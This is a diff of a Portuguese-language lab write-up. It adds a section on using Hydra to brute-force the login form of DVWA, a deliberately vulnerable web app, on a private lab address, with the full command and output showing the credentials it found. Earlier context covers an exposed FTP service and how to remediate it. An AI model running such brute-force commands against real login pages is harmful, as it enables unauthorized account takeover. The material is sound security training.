@@ -87,6 +87,29 @@ ftp 192.168.0.155
 - o usuário e senha são pedidos e inseridos, estabelecendo conexão e expondo a máquinas à perigos como exposição de dados sensíveis, execução remota de código, interceptação de tráfego e adulteração ou destruição de arquivos
 
 ### Remediação
-• Substituir o protocolo: Desativar o FTP tradicional e migrar o serviço para SFTP (SSH File Transfer Protocol) ou FTPS (FTP sobre SSL/TLS), garantindo que toda a comunicação seja criptografada.  
-• Desabilitar acesso anônimo: Configurar o servidor (ex: vsftpd, ProFTPD) para bloquear logins anônimos.  
-• Princípio do menor privilégio: Restringir os usuários autenticados apenas aos seus diretórios específicos (chroot jail) e remover permissões de escrita onde não forem estritamente necessárias.  
+- Substituir o protocolo: Desativar o FTP tradicional e migrar o serviço para SFTP (SSH File Transfer Protocol) ou FTPS (FTP sobre SSL/TLS), garantindo que toda a comunicação seja criptografada.  
+- Desabilitar acesso anônimo: Configurar o servidor (ex: vsftpd, ProFTPD) para bloquear logins anônimos.  
+- Princípio do menor privilégio: Restringir os usuários autenticados apenas aos seus diretórios específicos (chroot jail) e remover permissões de escrita onde não forem estritamente necessárias. 
+
+## Automação de Tentativas em Formulário Web (DVWA) com Hydra
+
+Como o Medusa não lida bem com sites, utilizei o Hydra
+
+### 1. Explicando o comando  
+```text
+hydra -L (arquivo com usuários) -P (arquivo com senhas) (ip alvo) (tipo do alvo) "(caminho do site):(parametros da requisição)" -I
+
+```
+### 2. O aplicativo tentará usar cada combinação usuario-senha para encontrar a correta
+- Acessar http://(seu ip)/dvwa/login.php -> F12 -> rede -> tentar user e senha errados -> primeira requisição -> forma dos parametros
+
+input
+```bash
+hydra -L users.txt -P pass.txt 192.168.0.155 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -I
+```
+
+observado:
+```bash
+[80][http-post-form] host: 192.168.0.155   login: admin   password: password
+```
+- se tem usuário e senha para logar
